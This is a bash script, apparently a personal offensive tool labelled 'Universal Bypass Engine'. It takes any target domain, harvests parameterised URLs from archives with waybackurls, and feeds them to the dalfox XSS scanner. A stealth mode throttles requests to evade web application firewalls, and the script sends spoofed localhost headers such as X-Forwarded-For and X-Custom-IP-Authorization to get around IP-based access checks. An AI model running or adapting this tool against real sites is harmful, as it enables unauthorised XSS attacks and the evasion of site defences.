#!/bin/bash

# الألوان للتنسيق (Colors)
G='\033[0;32m'
R='\033[0;31m'
Y='\033[1;33m'
C='\033[0;36m'
NC='\033[0m'

banner() {
    clear
    echo -e "${C}    ██████  ███████ ██   ██ ███████ ███████ "
    echo "    ██   ██ ██       ██ ██  ██      ██      "
    echo "    ██████  █████     ███   ███████ ███████ "
    echo "    ██   ██ ██       ██ ██       ██      ██ "
    echo "    ██████  ███████ ██   ██ ███████ ███████ "
    echo -e "    ${Y}      UNIVERSAL BYPASS ENGINE | BY: FAISAL${NC}"
    echo -e "    ${R}--------------------------------------------${NC}"
}

banner

# طلب النطاق بشكل عام
read -p "[?] Enter Target Domain: " target
if [ -z "$target" ]; then
    echo -e "${R}[!] Error: Target domain is required.${NC}"
    exit 1
fi

echo -e "\n${C}[Select Mode]:${NC}"
echo -e "${Y}[1] Express Scan (Fast)${NC}"
echo -e "${Y}[2] Ghost Stealth (Bypass WAF/Slow)${NC}"
read -p "[?] Choice: " mode

if [ "$mode" == "2" ]; then
    WORKERS=2
    DELAY=1500
    TIMEOUT=45
    echo -e "${G}[!] Stealth Mode Activated...${NC}"
else
    WORKERS=10
    DELAY=0
    TIMEOUT=15
fi

# 1. جمع الروابط وتنظيفها الشامل
echo -e "${Y}[*] Gathering and filtering URLs...${NC}"
rm -f xss_targets.txt

# سحب الروابط وفلترة كافة الملفات غير القابلة للحقن لضمان الدقة
waybackurls $target | grep "?" | grep -vE "\.(jpg|jpeg|png|gif|css|js|woff|svg|pdf|mp4|zip|exe|iso|dmg|bin|apk|txt|xml)" | sort -u > xss_targets.txt

if [ ! -s xss_targets.txt ]; then
    echo -e "${R}[X] No injectable targets found.${NC}"
    exit 1
fi

echo -e "${G}[+] Targets identified: $(wc -l < xss_targets.txt)${NC}"

# 2. تشغيل المحرك بكامل ميزات التخطي
echo -e "${Y}[*] Launching Bypass Attack... Results will be saved to: results_$target.txt${NC}"

cat xss_targets.txt | dalfox pipe --worker $WORKERS --delay $DELAY --timeout $TIMEOUT \
--user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" \
--header "X-Forwarded-For: 127.0.0.1" \
--header "X-Real-IP: 127.0.0.1" \
--header "X-Client-IP: 127.0.0.1" \
--header "Forwarded: for=127.0.0.1;by=127.0.0.1" \
--header "X-Custom-IP-Authorization: 127.0.0.1" \
--mining-dict \
--mining-dom \
--follow-redirects \
--output "results_$target.txt"

echo -e "\n${G}[✓] Operation Complete!${NC}"
